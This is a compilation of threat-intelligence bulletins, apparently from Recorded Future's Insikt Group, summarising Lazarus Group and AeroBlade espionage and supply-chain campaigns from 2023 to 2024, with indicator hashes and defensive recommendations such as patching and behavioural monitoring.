The North Korea-linked Lazarus Group has been identified as the perpetrator of a cyber espionage attack targeting an aerospace company in Spain. According to an ESET report published on September 29, 2023, Lazarus Group approached company employees while posing as a recruiter on LinkedIn, tricking them into opening a malicious executable file disguised as a coding challenge. ESET linked the attack to "Operation Dream Job", a long running spearphishing campaign wherein Lazarus Group aims to lure employees of strategic targets with enticing job opportunities. The ultimate objective of the attack is to deploy a sophisticated backdoor called LightlessCan.

The attack began with the victim receiving messages on LinkedIn and being convinced to download and execute malicious ISO files, resulting in the compromise of the system. The attackers then use an HTTP(S) downloader called NickelLoader to deploy additional malware, including LightlessCan and a variant of BLINDINGCAN called miniBlindingCan. LightlessCan replicates the capabilities of numerous native Windows commands, allowing for operations within the backdoor rather than conspicuous console actions. This tactical adaptation heightens its stealth, complicating the detection and analysis of the threat actor's movements. The campaign also employed execution guardrails to prevent the payloads from being decrypted or run on unintended machines.

DPRK-Linked Threat Actors Target Blockchain Engineers with 'KANDYKORN' macOS Malware
By Insikt Group | Published Nov 2, 2023
Note
Diamond Model
Entities
Sources
On November 1, 2023, Elastic Security Labs reported that threat actors associated with the Democratic People's Republic of Korea (DPRK) were targeting blockchain engineers from an undisclosed crypto exchange platform using a new macOS malware named "KANDYKORN." KANDYKORN features multi-stage malicious capabilities, enabling threat actors to access files, control data and files, and execute processes and commands on compromised systems. While Elastic Security Labs did not directly attribute this activity with a known DPRK group, it said it observed “overlaps” with tactics and infrastructure used by the Lazarus Group.

The campaign began with threat actors posing as blockchain engineering community members on a public Discord server. The attackers used social engineering techniques to lure victims into downloading a ZIP archive file (Cross-Platform Bridges.zip). The malicious ZIP file was falsely presented as an arbitrage bot, a software tool designed for generating profits through cryptocurrency rate variances across platforms. Upon execution, the ZIP file activated the Python script “watcher.py”. When decompressed, this script contained a folder of 13 Python scripts which, among other activities, discreetly established outbound network connections and established local directory paths in the compromised machine. Another Python script, “testSpeed.py”, obtained a Python dropper file called “FinderTools” from a Google Drive URL, leading to the download and execution of a concealed payload named "SUGARLOADER." SUGARLOADER then established a connection within the threat actor’s command-and-control (C2) server to retrieve and execute the final macOS malware payload,  KANDYKORN. KANDYKORN was executed in-memory, waited for commands from the C2 server, and then performed data exfiltration to the C2 server and other malicious tasks.

Lazarus Group Exploiting Security Flaws in Software Vendor to Deploy SIGNBT and LPEClient
By Insikt Group | Published Oct 30, 2023 | Last modified Nov 16, 2023
Note
Diamond Model
Entities
Sources
On October 27, 2023, Kaspersky reported a new North Korea-sponsored Lazarus Group campaign targeting a Russian software vendor’s encryption software; this campaign involves the deployment of the SIGNBT loader and LPEClient to steal source code and tamper with supply chains. Lazarus Group exploited previously-patched flaws in an unspecified software to enable the deployment of the malware. After Lazarus Group gained persistence, an in-memory loader deployed SIGNBT for command and control (C2) server communication, employing stage-specific prefixes: 

SIGNBTLG: Initial connection
SIGNBTKE: Gathering system metadata after a SUCCESS message from the C2 server
SIGNBTGC: Fetching commands
SIGNBTFI: Communication failure
SIGNBTSR: Successful communication

Lazarus Group also employed a Windows backdoor for process control, file operations, and further malware deployment, including LPEClient for controlling compromised systems and credential-dumping.  LPEClient was first discovered in 2020 and “is designed to collect victim information and download additional payloads from a remote server to run in memory”. Kaspersky observed multiple Lazarus campaigns throughout 2023, each involving different attack vectors but consistently employing LPEClient as the final-stage malware.

Lazarus Group has been very active in the last 1 year, carrying out a wide variety of threat campaigns on varying targets with varying objectives. In fact, security researchers reported on numerous Lazarus Group campaigns that occurred from late September to October 2023 alone. Most of the campaigns were aimed at data theft and cyber espionage attacks on organizations operating in aerospace, defense, and nuclear sectors.

On October 17, 2023, Kaspersky reported that as part of an ongoing campaign dubbed Operation Dream Job, Lazarus Group targeted job seekers across the defense and nuclear industries via a trojanized virtual network computing (VNC) application. Targets included entities in the production of radar systems, UAVs, military vehicles, and maritime companies. To achieve initial access in the target systems the group used spearphishing lures; the group lured victims working at targeted organizations to download malware via fake job opportunities on platforms like LinkedIn, Telegram, and WhatsApp. Operation Dream Job, coined by security researchers in 2020, encompasses all attack campaigns in which Lazarus Group lures employees of various strategic targets with enticing job opportunities via LinkedIn, with the ultimate goal of deploying malware on victims’ devices to enable cyber espionage or the theft of cryptocurrency. 

In another recent Operation Dream Job campaign, ESET disclosed on September 29, 2023, that Lazarus Group carried out a cyber espionage attack on an unnamed aerospace company in Spain. Lazarus Group approached company employees while posing as a recruiter on LinkedIn, tricking them into opening a malicious executable file disguised as a coding challenge. The ultimate objective of the attack was to deploy a sophisticated backdoor called LightlessCan for espionage purposes.

On October 18, 2023, Microsoft reported that Lazarus Group and Andariel had exploited a vulnerability in TeamCity servers tracked as CVE-2023-42793. CVE-2023-42793 allows for remote code execution, resulting in the theft of Local Security Authority Subsystem Service (LSASS) credentials which can then be used for lateral network movement. Upon compromising TeamCity servers, Lazarus employed 2 attack chains: one involved deploying the ForestTiger malware as a backdoor to execute commands on the breached server. The second involved using DLL search order hijacking to deploy a malware loader named FeedLoad, which installed an unnamed remote access Trojan (RAT). 

Microsoft did not specify what types of organizations were targeted in this attack, nor the ultimate intent of the attack campaign. Although Microsoft did note that Lazarus Groups typical objectives include “espionage, data theft, financial gain, and network destruction”. According to its website, “TeamCity is a general-purpose continuous integration and continuous delivery/continuous deployment (CI/CD) software platform that allows for flexible workflows, collaboration and [software] development practices”. Targeting TeamCity servers could lead to the theft of proprietary source code from any organization that uses the service. According to open sources, companies that use TeamCity include Accenture, ebay, Stack Overflow, Apple, and Intuit, among others.

First seen in 2009, when the group was involved in a series of distributed denial-of-service (DDoS) attacks, Lazarus Group has been observed targeting organizations within the aerospace, defense, engineering, finance, government, media, and technology sectors. The group uses a combination of commodity and open-source malware, as well as custom remote access trojans (RATs), and has also used multiple open source Offensive Security Tools to conduct network reconnaissance, credential access, and to establish persistence. Relevant to the TeamCity vulnerability and the details of this most recent threat campaign, Lazarus demonstrates a pattern of exploiting previously patched vulnerabilities. 

Lazarus Group will likely continue to be a very active state-sponsored threat group that poses a persistent threat across the aerospace, defense, engineering, finance, government, media, and technology sectors. Of late, Lazarus Group favors targeting organizations operating in the aerospace, defense, and nuclear sectors to achieve persistence for cyber espionage purposes.  

Although Lazarus Group is a well-resourced threat group with likely targeted objectives when it carries out an attack campaign, Lazarus most frequently targets organizations on an opportunistic basis; compared to other APT groups, its attacks may be easier to defend against via traditional security hygiene practices, such as credential hygiene, patch management, and mandatory security best practices training for employees. Aligning with this, the group frequently uses predictable methods of initial access. These predictable methods of initial access include job recruitment themed spearphishing lures and the exploitation of previously disclosed and patched vulnerabilities, as was the case with this threat campaign and the threat campaign targeting Team City servers. 

Had the victim organization targeted in this campaign had a patch in place, Lazarus Group’s attack may have been prevented. Organizations are urged to ensure that they have a robust patch management program in place, to prevent such opportunistic attacks. This program should regularly interact with and receive data from a real-time threat intelligence function. The program should also incorporate the necessity of getting buy-in from all relevant stakeholders prior to patch deployment. For example, patching that requires services to be temporarily halted or altered would require getting buy-in from business operations managers. Holistic collaboration and information sharing will allow for efficient prioritization of patch deployments and facilitate a sustainable patch deployment program.

Additionally, Lazarus Group used the known malware LPEClient, to enable its campaign. Threat hunters can prime their systems to detect infection by both LPEClient and the novel malware SIGNBT via the indicators of compromise (IOCs) provided and in Kaspersky’s original report. 

To prevent attacks that go beyond opportunistic targeting of unpatched systems or to identify attacks that have resulted in threat actors achieving persistence on an enterprise device for data exfiltration purposes, organizations are urged to enrich their security systems with behavioral analytics tools. Splunk states that “behavioral analytics can help identify the presence of APTs by monitoring any unusual activity that deviates from typical patterns and behaviors,” given that “APTs aim to gain prolonged access to the server of an organization, making it more difficult to detect them.” In the event that Lazarus Group is able to infiltrate a system via spearphishing or an unpatched service and achieve persistence, behavioral analytics can help security teams identify and mitigate a Lazarus Group intrusion in a timely manner, regardless

Diamond Sleet Supply Chain Attack Distributes Modified CyberLink Installer
By Insikt Group | Published Nov 23, 2023 | Last modified Nov 28, 2023
Note
Diamond Model
Entities
Sources
On November 22, 2023, Microsoft reported that the North Korean state-sponsored threat group Lazarus Group (tracked as Diamond Sleet by Microsoft) launched a supply chain attack using a modified installer for an application developed by CyberLink, a Taiwanese multimedia software company. Lazarus Group modified the CyberLink installer to distribute LambLoad, a trojan downloader and loader malware. This compromised installer, found on authentic CyberLink update infrastructure, was identified on over 100 devices globally, including in Japan, Taiwan, Canada, and the US. Additionally, Lazarus Group used a legitimate code signing certificate to authenticate the malicious installer. Microsoft has since added this certificate to its restricted certificate list, safeguarding customers from future exploitation.

Prior to execution, LambLoad checked for security solutions like FireEye, CrowdStrike, or Tanium. If these solutions were present, the loader halted its code execution to avoid detection. If these solutions were not present — meaning the victim did not have FireEye, CrowdStrike, or Tanium installed —  LambLoad connected to 1 of 3 command-and-control (C2) servers, retrieving a second-stage payload disguised as a PNG file. This payload, once decrypted and run, established communication with callback servers for additional malicious instructions.

According to Microsoft, Lazarus Group’s aim was to infiltrate systems for control, data theft, system disruption, espionage, and backdoor access creation. However, Microsoft stated that it has not yet observed any data exfiltration or other follow-on activities specific to this LambLoad campaign. Historically, Lazarus Group has used its access to victim environments to exfiltrate stolen data, move laterally across environments for follow-on exploitation, and establish persistent access to victim environments.

Lazarus Group Supply Chain Attack Distributes Modified CyberLink Installer
By Insikt Group | Published Dec 4, 2023
Note
Diamond Model
Entities
Sources
On November 22, 2023, Microsoft reported that the North Korean state-sponsored threat group Lazarus Group (tracked as Diamond Sleet by Microsoft) launched a supply chain attack using a modified installer for an application developed by CyberLink, a Taiwanese multimedia software company. CyberLink develops various applications intended to allow playback and editing of photos and videos. Lazarus Group modified the CyberLink installer to distribute LambLoad, a trojan downloader and loader malware. This compromised installer was hosted on authentic CyberLink update infrastructure. Additionally, Lazarus Group used a legitimate code signing certificate to sign the malicious installer. Microsoft has since added this certificate to its restricted certificate list, but identified LambLoad on over 100 devices globally, including in Japan, Taiwan, Canada, and the US.

Prior to execution, LambLoad checked for security solutions like FireEye, CrowdStrike, or Tanium. If these solutions were present, the loader halted its code execution to avoid detection. If these solutions were not present — meaning the victim did not have FireEye, CrowdStrike, or Tanium installed —  LambLoad connected to 1 of 3 command-and-control (C2) servers, retrieving a second-stage payload disguised as a PNG file. This payload, once decrypted and run, established communication with callback servers for additional malicious instructions.

According to Microsoft, Lazarus Group’s aim was to infiltrate systems for control, data theft, system disruption, espionage, and backdoor access creation. However, Microsoft stated that it has not yet observed any data exfiltration or other follow-on activities specific to this LambLoad campaign. Historically, Lazarus Group has used its access to victim environments to exfiltrate stolen data, move laterally across environments for follow-on exploitation, and establish persistent access to victim environments.

We used Recorded Future Sandbox analysis to retrieve additional data for each of the SHA-256 hashes associated with the malicious CyberLink installer (LambLoad) and PNG payloads, as shared by Microsoft. The following signatures were detected in Triage for these samples:

166d1a6ddcde4e859a89c2c825cd3c8c953a86bfa92b343de7e5bfbfb5afb8be (LambLoad): Reads user/profile data of web browsers; Checks computer location settings; Modifies system certificate store; Suspicious use of SetWindowsHookEx
089573b3a1167f387dcdad5e014a5132e998b2c89bff29bcf8b06dd497d4e63d (Second-stage PNG payload): Enumerates physical storage devices; Suspicious use of FindShellTrayWindow. A sample on November 28, 2023, was submitted by an organization in Petroleum, Oil and Gas-related equipment and services, Manufacturing industries.
915c2495e03ff7408f11a2a197f23344004c533ff87db4b807cc937f80c217a1 (Decrypted PE from second-stage PNG): Unsigned Portable Executable (PE); Suspicious use of WriteProcessMemory

Based on our sandbox analysis, we corroborate Microsoft’s findings that the LambLoad malware can view and modify web browser data, check for the data and time of the local host, and enable a callback function (hook function) via SetWindowsHookEx. Additionally, the second-stage PNG payload can actively search and list available physical storage devices (e.g., hard drives, USB drives) on a computer system, likely for the identification of sensitive data.

Lazarus Group is known to use custom malware like LightlessCan, BLINDINGCAN, and wAgent, and Bookcode for remote access capabilities. Lazarus Group actors often combine these custom malware with open source offensive security tools to conduct network reconnaissance, credential access, and to establish persistence. Some of these open source tools include PuTTY, Responder, Adfind, and Mimikatz.

We have observed Lazarus Group making frequent use of trojanized applications and installers to deliver malware to its targets to enable software supply chain attacks. In May 2020, Malwarebytes reported that Lazarus Group delivered Dacls RAT using a trojanized application for macOS called MinaOTP. Lazarus Group also previously created custom trojanized installers to deliver MATA framework malware, and was observed spreading BLINDINGCAN malware using a trojanized version of the open-source tool PuTTY. More recently, in March 2023, Insikt Group observed reports of a potential supply-chain compromise affecting 3CX VOIP softphone users that used a legitimate, signed binary. A month later, Mandiant discovered that the 3CX software supply chain attack was likely facilitated by collaboration between Lazarus Group and the North Korean threat group Kimsuky.

Several Lazarus Group campaigns have also made use of stolen and forged digital certificates, which they used to sign malicious binaries. For example, Lazarus Group was previously linked to a 2020 supply chain attack in South Korea that used trojanized security software and stolen digital certificates to distribute remote administration tools on a target system. Additionally, Lazarus Group reportedly obtained code-signing certificates from Dream Security USA, a manufacturer of security devices and services, to sign the malware samples.

Based on our sandbox analysis, we also recommend monitoring for suspicious use of SetWindowsHookEx, FindShellTrayWindow, and WriteProcessMemory functions. Monitoring for use of these functions can help prevent unauthorized or malicious activities that involve manipulation of system memory of other processes.

The improper modification of code signing certificates poses a particular threat to organizations, given that they challenge the inherent trust users have in these certificates. We recommend that organizations analyze code signing certificates for hallmarks of an adversary and malicious developers, like their reuse of forged/legitimate company or certificate authority names. Malware repositories and prior research can also provide insight into previous ways that threat actors have obtained legitimate code signing certificates for malicious use which can be used to monitor for future patterns of activity.

We recommend ensuring that your organization has reviewed IOCs associated with Lazarus Group activity to monitor for signs of suspicious activity in your organizations’ environment. To facilitate this process, Insikt Group provides Hunting Packages associated with Lazarus Group.

Newly Discovered Threat Group, AeroBlade, Targets the US Aerospace Industry
By Insikt Group | Published Dec 7, 2023
Note
Diamond Model
Entities
Sources
On November 30, 2023, BlackBerry reported that it had observed a new threat actor dubbed AeroBlade targeting US aerospace organizations. AeroBlade reportedly targeted the sector in two phases: an initial test attack in September 2022 and a more advanced operation in July 2023. BlackBerry also noted that the threat actor improved its toolset in between the two attacks, increasing the sophistication of the operation.

In both attacks, AeroBlade targeted victims with spearphishing emails with malicious Microsoft Word document attachments. These files were titled [redacted].docx. The document used remote template injection to download a second stage payload, which in turn executed an Extensible Markup Language (XML) file responsible for creating a reverse shell communicating over port 443 .

Unique to the second attack, a dynamic link-library (DLL) file is the final payload, which acts as a reverse shell and features several anti-analysis mechanisms. These include sandbox detection, custom string encoding, disassembly protection via dead code and control flow obfuscation, and API hashing to mask Windows function abuse. In addition, the file used in the second more sophisticated attack enumerated directories from infected machines, likely for threat actors to be able to identify sensitive data on victim environments or to be able to use certain directories to establish persistence, given that the later attack also used the Windows Task Scheduler to achieve persistence.

BlackBerry was unable to determine AeroBlade’s origins, although it assessed with a high degree of confidence that its activity was a commercial cyber-espionage campaign.

Reports of AeroBlade’s recent attacks follow reports of other cyber threat events targeting the aerospace industry over the past 3 months. We identified events ranging from cybercriminals conducting ransomware attacks to advanced persistent threat (APT) groups conducting a cyber-espionage campaign against an aerospace company. In November 2023, the LockBit Gang leaked 43 gigabytes of files stolen from US aircraft company Boeing following a cyberattack that took place on October 27, 2023 (Boeing confirmed the attack). The leaked data included information on security protocols, IDs for restricted areas, CCTV camera locations, and other sensitive documents.

In September 2023, the North Korea-linked Lazarus Group (Cyber Warfare Guidance Unit, Diamond Sleet) was reported to be the perpetrator of a cyber-espionage attack targeting an aerospace company in Spain. The attack involved employees of the company being approached by a fake recruiter on LinkedIn, who tricked them into opening a malicious executable file disguised as a coding challenge or quiz. This attack was part of a larger spearphishing campaign called Operation Dream Job, which aims to lure employees of strategic targets with enticing job opportunities.

These 3 events do not necessarily mean that the industry as a whole faces increased threats. However, we recommend that defenders in the aerospace industry monitor these events, and the tactics, techniques, and procedures (TTPs) of the actors involved. We specifically recommend monitoring groups like AeroBlade and Lazarus Group, who specifically targeted aerospace companies in their attacks (compared to ransomware groups that tend to attack victims opportunistically).

Based on the 2 types of attacks used by AeroBlade, we assess that the group will continue to hone its infrastructure and TTPs to conduct future attacks against US aerospace companies. However, to the extent that BlackBerry’s assessment of the group’s intent to commit commercial cyber espionage is accurate, AeroBlade’s operations can only continue to the extent that they remain undetected and unattributed — given that stealing company information through corporate espionage is widely illegal in the United States.

Nonetheless, defenders that fit within AeroBlade’s victimology should focus on protecting against and detecting AeroBlade’s tools, which is predominantly done by monitoring known IoCs (listed below). At the organizational level, however, we also recommend protecting against spearphishing and phishing attacks, given the attack was initiated through a phishing document. Defenders can periodically train employees to avoid opening files from an unknown sender. By comparison, detecting the malicious files (DLLs) once they are already in a victim system is more difficult, since malicious DLLs are notoriously difficult to identify within environments.

Lazarus Group Uses Log4Shell to Deploy DLang-Based Malware
By Insikt Group | Published Dec 12, 2023 | Last modified Dec 15, 2023
Note
Diamond Model
Entities
Sources
Cisco Talos discovered a new campaign conducted by the Lazarus Group, called “Operation Blacksmith,” which involves the use of 3 new DLang-based malware families to perform reconnaissance and data exfiltration. 2 of these families are remote access trojans (RATs), with 1 (called “NineRAT”) using Telegram bots and channels for command and control (C2) communications. Cisco observed overlap between this campaign and the activities of the North Korean state-sponsored group Andariel (Onyx Sleet, Silent Chollima), a sub-group of Lazarus Group.

The infection chain began with the opportunistic exploitation of CVE-2021-44228 (Log4Shell) to gain initial access to victim networks. Once Lazarus Group established a foothold, they relied on a custom-made reverse proxy tool called HazyLoad for persistent backdoor access to the infected host. Lazarus Group and Andariel’s use of HazyLoad has been previously seen by Microsoft researchers once before in October 2023. 

Then, the attackers used credential dumping tools like Mimikatz, and delivered NineRAT for a persistent form of communication with the target host. NineRAT interacted with Telegram over DLang-based libraries to blend in with network traffic while establishing C2 communications, performing system reconnaissance, and enabling file transfers. To further evade detection, the NineRAT malware used a modular infection chain to separate, upgrade, and modify individual components.

Additionally, Lazarus Group deployed “BottomLoader”, a DLang-based downloader capable of retrieving and executing a next-stage payload, like HazyLoad. BottomLoader can also upload files to the C2 server using PowerShell. The threat actors were also seen using “DLRAT”, a tool that can load additional malware, establish remote access, retrieve commands from the C2, and execute commands. DLRAT first performs system reconnaissance, and then beacons to its C2 and carries out various commands for file renaming, file uploading, and self deletion. 

Cisco noted that Lazarus Group has been increasingly relying on the use of uncommon technologies (e.g. DLang, QtFramework, PowerBasic) in their malware development, as seen in their MagicRAT and QuiteRAT variants. Lazarus’ shift to uncommon technologies speaks to a broader trend across the threat landscape of attackers using uncommon, “exotic”, or “rare” programming languages like Go, Rust, and Swift to write malware (as opposed to more commonly used coding languages like C/C++ or JavaScript).. These uncommon, newer programming languages offer threat actors developmental and operational advantages, for example better anti-analysis capabilities due to less robust detections for these newer or more uncommon programming languages. 

We used a query to identify malware families created, modified, or employed by threat actors written in uncommon programming languages in the past year, and detected instances of this tactic used by state-sponsored threat actors, ransomware groups, and cybercriminals. 

We also used the Recorded Future Sandbox to further analyze the hashes provided by Cisco associated with HazyLoad, NineRAT, BottomLoader, and DLRAT. A hash associated with NineRAT, for example, displayed the following malicious processes: Creates new service(s); Stops running service(s); Checks computer location settings; Executes dropped EXE; Loads dropped DLL. Security teams can use the Sandbox tool to further explore the behaviors associated with the malware to better understand their functionality on the infected host. 

This campaign by Lazarus has targeted manufacturing, agricultural, and physical security companies. However, enterprises globally with infrastructure exposed to vulnerability exploitation, particularly the Log4Shell vulnerability, are at risk. To deter successful initial access, we recommend that all companies keep their public-facing applications up-to-date with the latest patches for vulnerabilities associated with known exploitation. For guidance about the Log4Shell more specifically, we recommend referring to Recorded Future’s overview: Log4Shell: How It’s Being Exploited and How to Mitigate Damage.

We anticipate that threat actors will continue to adopt use of uncommon programming languages due to the broad amount of capabilities that they afford malware developers. In light of this trend, we recommend that security researchers and defenders maintain and employ behavior-based detections based on “uncommon” programming language variants like Go, Rust, and Swift. 

C2 traffic over Telegram, like that used by NineRAT, can be particularly hard to detect since it can blend in as part of legitimate traffic. Organizations can enforce strict policies on outgoing connections, or block connections to and from services like Telegram if they are not needed for business functions. Additionally, to protect against Lazarus Groups’ RAT malwares, we recommend organizations configure intrusion detection systems (IDS), intrusion prevention systems (IPS), or any network defense mechanisms in place to alert on items such as the file hashes associated with NineRAT, BottomLoader, HazyLoad, and DLRAT; these are listed in Cisco’s report. Finally, organizations can use Recorded Future’s Hunting Packages to detect known IOCs associated with Lazarus Group activity more broadly.

IOCs/Associated Malware/TTPs:  A full list of IOCs can be found in Cisco’s report and on GitHub.

Lazarus Group Advances Cyber Espionage with Advanced DLL Technique Targeting South Korea
By Insikt Group | Published Jan 25, 2024
Note
Diamond Model
Entities
Sources
On January 23, 2024, AhnLab Security Intelligence Center (ASEC) reported that North Korea-linked Lazarus Group employed Dynamic-Link Library (DLL) side-loading techniques in an ongoing campaign. The Lazarus Group is an Advanced Persistent Threat (APT) group that primarily  targets South Korean companies, institutions, and think tanks. In this campaign, Lazarus Group weaponized legitimate executables and DLL files, including "wmiapsrv.exe", a legitimate Microsoft module, to load a malicious version of "wbemcomn.dll" and an additional malicious DLL, "netutils.dll". The DLLs function as backdoors to persist in the victim’s system and to evade detection. 

The wbemcomn.dll file specifically checks the target system’s firmware by reading a function called GetSystemFirmwareTable. This indicates that Lazarus Group is targeting specific system architectures, suggesting that the campaign is highly targeted. Conversely, netutils.dll demonstrates a more direct method, wherein it can execute specified files without the need for checking the system’s firmware.

ASEC’s analysis of the Lazarus Group's strategies underscores the necessity for improved monitoring and security protocols.

